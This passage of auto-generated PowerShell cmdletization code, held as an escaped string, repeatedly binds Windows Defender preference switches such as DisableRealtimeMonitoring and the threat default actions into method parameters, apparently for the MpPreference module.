$__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\r\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\r\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\r\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('EnableConvertWarnToBlock')) {\r\n          [object]$__cmdletization_value = ${EnableConvertWarnToBlock}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableConvertWarnToBlock'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\r\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('MAPSRe"
"porting')) {\r\n          [object]$__cmdletization_value = ${MAPSReporting}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\r\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableAutoExclusions')) {\r\n          [object]$__cmdletization_value = ${DisableAutoExclusions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableAutoExclusions'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisablePrivacyMode')) {\r\n          [object]$__cmdletization_value = ${DisablePrivacyMode}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisablePrivacyMode'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('RandomizeScheduleTaskTimes')) {\r\n          [object]$__cmdletization_value = ${RandomizeScheduleTaskTimes}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'RandomizeScheduleTaskTimes'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SchedulerRandomizationTime')) {\r\n          [object]$__cmdletization_value = ${SchedulerRandomizationTime}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SchedulerRandomizationTime'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableBehaviorMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableBehaviorMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBehaviorMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIntrusionPreventionSystem')) {\r\n          [object]$__cmdletization_value = ${DisableIntrusionPreventionSystem}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIntrusionPreventionSystem'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableIOAVProtection')) {\r\n          [object]$__cmdletization_value = ${DisableIOAVProtection}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableIOAVProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRealtimeMonitoring')) {\r\n          [object]$__cmdletization_value = ${DisableRealtimeMonitoring}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRealtimeMonitoring'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScriptScanning')) {\r\n          [object]$__cmdletization_value = ${DisableScriptScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScriptScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableArchiveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableArchiveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableArchiveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableCatchupQuickScan')) {\r\n          [object]$__cmdletization_value = ${DisableCatchupQuickScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCatchupQuickScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableEmailScanning')) {\r\n          [object]$__cmdletization_value = ${DisableEmailScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableEmailScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRemovableDriveScanning')) {\r\n          [object]$__cmdletization_value = ${DisableRemovableDriveScanning}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRemovableDriveScanning'; ParameterType = 'System.Management.Automation.Switch"
"Parameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableRestorePoint')) {\r\n          [object]$__cmdletization_value = ${DisableRestorePoint}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableRestorePoint'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningMappedNetworkDrivesForFullScan')) {\r\n          [object]$__cmdletization_value = ${DisableScanningMappedNetworkDrivesForFullScan}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningMappedNetworkDrivesForFullScan'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisableScanningNetworkFiles')) {\r\n          [object]$__cmdletization_value = ${DisableScanningNetworkFiles}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableScanningNetworkFiles'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ApplyDisableNetworkScanningToIOAV')) {\r\n          [object]$__cmdletization_value = ${ApplyDisableNetworkScanningToIOAV}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ApplyDisableNetworkScanningToIOAV'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UILockdown')) {\r\n          [object]$__cmdletization_value = ${UILockdown}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UILockdown'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Ids')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Ids}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Ids'; ParameterType = 'System.Int64[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ThreatIDDefaultAction_Actions')) {\r\n          [object]$__cmdletization_value = ${ThreatIDDefaultAction_Actions}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ThreatIDDefaultAction_Actions'; ParameterType = 'Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('UnknownThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${UnknownThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\r\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 